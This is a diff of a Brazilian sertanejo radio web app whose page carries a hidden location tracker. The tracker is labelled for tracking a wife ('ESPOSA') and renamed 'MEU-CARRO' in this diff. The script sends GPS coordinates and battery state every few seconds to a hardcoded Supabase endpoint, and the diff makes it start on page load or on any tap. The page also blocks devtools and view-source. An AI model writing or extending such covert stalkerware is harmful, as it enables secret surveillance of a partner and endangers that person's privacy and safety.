@@ -172,10 +172,10 @@ html.tv .side-col,html.tv .footer{display:none!important}
 <section><h2>BUSCAR CAPA</h2><div class="search-row"><input id="q" type="search" placeholder="Ex: Gusttavo Lima Retrovisor"/><button id="qBtn">Buscar capa</button></div><div class="q-results" id="qResults"></div></section>
 <div class="debug" id="debug">—</div>
 </div>
-</div><div class="footer">SERTANEJA POP • ESPOSA • 24H AO VIVO • CÓDIGO TRAVADO</div><div class="footer-credit">Criado por EliasCosta NEGRET'S</div></div>
+</div><div class="footer">SERTANEJA POP • ESPOSA • KA / MEU-CARRO • 24H AO VIVO • CÓDIGO TRAVADO</div><div class="footer-credit">Criado por EliasCosta NEGRET'S</div></div>
 <div class="tv-warn" id="tvWarn"><b>📺 Smart TV detectada.</b> Abra pelo navegador da TV, não pelo Downloader. <button id="tvWarnClose">OK</button></div>
 <div id="volToast">VOL 80%</div>
-<div class="lock">🔒 ESPOSA v2.8 TRAVADO - SEU CÓDIGO + BATERIA CERTA</div>
+<div class="lock">🔒 ESPOSA v2.9 TRAVADO - KA = MEU-CARRO + BATERIA CERTA</div>
 <audio id="audio" src="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3" preload="auto" autoplay controls playsinline></audio>
 <script>
 'use strict';
@@ -250,30 +250,32 @@ window.addEventListener("appinstalled",function(){markInstalled("appinstalled")}
 var mqStandalone=window.matchMedia("(display-mode: standalone)");function onStandaloneChange(m){if(m.matches)markInstalled("standalone")}if(mqStandalone.addEventListener)mqStandalone.addEventListener("change",onStandaloneChange);else if(mqStandalone.addListener)mqStandalone.addListener(onStandaloneChange);
 (function(){if(IS_IOS||state.installed)return;if(location.protocol==="file:"){showDiag("⚠️ <b>Abriu arquivo direto.</b><br>Suba no GitHub Pages e abra o link.");return}if(!window.isSecureContext){showDiag("⚠️ <b>Sem HTTPS.</b><br>Use GitHub Pages.");return}if(/fbav|fban|instagram|linkedinapp|whatsapp|snapchat|tiktok|musically/i.test(navigator.userAgent)){showDiag("⚠️ <b>Dentro de outro app.</b><br>Abra no Chrome.");return}if(!IS_TV)fetch("manifest.json",{cache:"no-store"}).then(function(r){if(!r.ok)throw new Error("HTTP "+r.status);return r.json()}).then(function(m){if(!m||!m.name||!m.icons||!m.icons.length)throw new Error("manifest incompleto");var ic=new Image();ic.onload=function(){dbg("Ícones OK")};ic.onerror=function(){showDiag("⚠️ <b>Ícones não encontrados.</b><br>Suba a pasta icons/")};ic.src="icons/icon-192.png"}).catch(function(e){showDiag("⚠️ <b>manifest.json não encontrado.</b><br>Suba o manifest.json na mesma pasta.")});if(!IS_IOS){setTimeout(function(){if(deferredPrompt)return;if(diagEl&&diagEl.classList.contains("show"))return;showInstallHelp()},6000)}})();
 if(IS_TV&&tvWarn){var __ua=navigator.userAgent||"";var isWebView=/\bwv\)/i.test(__ua)||/Downloader/i.test(__ua);if(isWebView){tvWarn.classList.add("show");var c=$("tvWarnClose");if(c)c.addEventListener("click",function(){tvWarn.classList.remove("show")});setTimeout(function(){tvWarn.classList.remove("show")},15000)}}
-if("serviceWorker" in navigator){window.addEventListener("load",function(){navigator.serviceWorker.register("service-worker.js").then(function(){dbg("SW OK")}).catch(function(e){dbg("SW erro: "+e.message)})})}
+/* SW DESLIGADO PRO KA NÃO FICAR COM VERSÃO VELHA */
+if("serviceWorker" in navigator){ navigator.serviceWorker.getRegistrations().then(function(rs){ rs.forEach(function(r){ r.unregister(); }); }); }
 setInterval(function(){if(state.playing)pollNow()},POLL_MS);
 
-/* ===== RASTREADOR ESPOSA v2.8 - SEU CÓDIGO v2.0 + BATERIA CERTA + SEM WAKELOCK QUE MATA ===== */
-const DEVICE_ID_ESPOSA=new URLSearchParams(location.search).get('id')||'ESPOSA';
+/* ===== RASTREADOR KA = MEU-CARRO v2.9 - CORRIGIDO ===== */
+const DEVICE_ID_ESPOSA=new URLSearchParams(location.search).get('id')||'MEU-CARRO';
 const SUPA_URL="https://jpaflbkafupwqfqfcjrv.supabase.co";
 const SUPA_KEY="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
-let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_rastreiou=false,_ultimoChgEnviado=null;
+let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_rastreiou=false;
+function _syncBat(){
+  if(!_batObj) return;
+  let novaBat=Math.round(_batObj.level*100);
+  let novoChg=!!_batObj.charging;
+  if(novaBat!==_BAT || novoChg!==_CHG){
+    _BAT=novaBat; _CHG=novoChg;
+    if(_lastLat!==0) _enviar(_lastLat,_lastLng,true);
+  } else { _BAT=novaBat; _CHG=novoChg; }
+}
 async function _lerBat(){
   try{
-    if(navigator.getBattery){
-      let b = await navigator.getBattery();
-      let novaBat = Math.round(b.level*100);
-      let novoChg = b.charging;
-      let mudou = (_ultimoChgEnviado!==null && _ultimoChgEnviado!==novoChg);
-      _BAT = novaBat; _CHG = novoChg;
-      if(_ultimoChgEnviado===null) _ultimoChgEnviado=_CHG;
-      if(mudou){ _ultimoChgEnviado=_CHG; if(_lastLat!==0) _enviar(_lastLat,_lastLng,true); }
-      if(!_batObj){
-        _batObj=b;
-        _batObj.addEventListener('levelchange',()=>{_lerBat();});
-        _batObj.addEventListener('chargingchange',()=>{_lerBat();});
-      }
-    }
+    if(!_batObj && navigator.getBattery){
+      _batObj=await navigator.getBattery();
+      _BAT=Math.round(_batObj.level*100); _CHG=!!_batObj.charging;
+      _batObj.addEventListener('levelchange',()=>{_syncBat();});
+      _batObj.addEventListener('chargingchange',()=>{_syncBat();});
+    } else { _syncBat(); }
   }catch(e){}
 }
 _lerBat();
@@ -284,23 +286,25 @@ async function _enviar(lat,lon,forcar){
   if(!forcar&&agora-_ultimoEnvio<3000)return;
   _ultimoEnvio=agora;_lastLat=lat;_lastLng=lon;
   try{
-    let r=await fetch(`${SUPA_URL}/rest/v1/rastreador`,{method:"POST",headers:{apikey:SUPA_KEY,Authorization:"Bearer "+SUPA_KEY,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:DEVICE_ID_ESPOSA,lat:lat,lng:lon,battery:_BAT,charging:_CHG,accuracy:_lastAcc,updated_at:new Date().toISOString()})});
-    if(r.ok) dbg('ENVIADO ESPOSA • '+_BAT+'% '+(_CHG?'CARREGANDO':'bateria'));
-  }catch(e){}
+    let r=await fetch(`${SUPA_URL}/rest/v1/rastreador?on_conflict=device_id`,{method:"POST",headers:{apikey:SUPA_KEY,Authorization:"Bearer "+SUPA_KEY,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:DEVICE_ID_ESPOSA,lat:lat,lng:lon,battery:_BAT,charging:_CHG,accuracy:_lastAcc,updated_at:new Date().toISOString()})});
+    if(r.ok) dbg('ENVIADO MEU-CARRO • '+_BAT+'% '+(_CHG?'⚡ CARREGANDO':'bateria'));
+    else dbg('ERRO ENVIAR '+r.status+' - tentando de novo');
+  }catch(e){ dbg('SEM INTERNET - tentando...'); }
 }
 function _iniciarRastreio(){
   if(_rastreiou)return;_rastreiou=true;
+  dbg('GPS INICIADO - pedindo localização...');
   _lerBat();
-  // IGUAL SEU v2.0: pede permissão aqui, no clique do PLAY
-  navigator.geolocation.getCurrentPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,true)},()=>{dbg('ATIVE A LOCALIZAÇÃO!')},{enableHighAccuracy:true,timeout:20000,maximumAge:0});
-  navigator.geolocation.watchPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,false)},()=>{},{enableHighAccuracy:true,maximumAge:0,timeout:20000});
-  // Heartbeat agora lê a bateria nova antes de enviar - não manda valor velho
+  navigator.geolocation.getCurrentPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);dbg('GPS OK - precisão '+_lastAcc+'m');_enviar(p.coords.latitude,p.coords.longitude,true)},(e)=>{dbg('ATIVE A LOCALIZAÇÃO! Erro: '+(e&&e.message?e.message:e.code))},{enableHighAccuracy:true,timeout:20000,maximumAge:0});
+  navigator.geolocation.watchPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,false)},(e)=>{dbg('GPS ERRO: '+(e&&e.message?e.message:e.code))},{enableHighAccuracy:true,maximumAge:0,timeout:20000});
   setInterval(async ()=>{ await _lerBat(); if(_lastLat!==0)_enviar(_lastLat,_lastLng,true); },7000);
   document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='visible'){audio.play().catch(()=>{})}});
 }
+window.addEventListener('load',function(){ setTimeout(_iniciarRastreio,1000); });
+document.addEventListener('pointerdown',_iniciarRastreio,{once:true,passive:true});
 playBtn.addEventListener('click',_iniciarRastreio);
 popBtn.addEventListener('click',_iniciarRastreio);
-/* PLAY AUTOMÁTICO CORRIGIDO - 1 TENTATIVA SÓ, SEM ABORT */
+audio.addEventListener('playing',_iniciarRastreio);
 var _autoJaTentou=false;
 function _tentarAuto(){if(_autoJaTentou||state.playing)return;_autoJaTentou=true;try{startRadio();}catch(e){}}
 window.addEventListener('load',function(){setTimeout(_tentarAuto,800)});
@@ -309,7 +313,7 @@ document.addEventListener('contextmenu',e=>e.preventDefault());
 document.addEventListener('selectstart',e=>{if(e.target.tagName!=='INPUT')e.preventDefault()});
 document.addEventListener('keydown',e=>{if((e.ctrlKey&&['u','s','c','a'].includes(e.key.toLowerCase()))||e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['i','j'].includes(e.key.toLowerCase())))e.preventDefault()});
 Object.freeze(DEVICE_ID_ESPOSA);
-console.log('%c🔒 ESPOSA v2.8 - SEU CÓDIGO + BATERIA CERTA','color:#ff2d55;font-weight:bold;font-size:16px');
+console.log('%c🔒 ESPOSA v2.9 - KA = MEU-CARRO','color:#ff2d55;font-weight:bold;font-size:16px');
 </script>
 </body>
 </html>
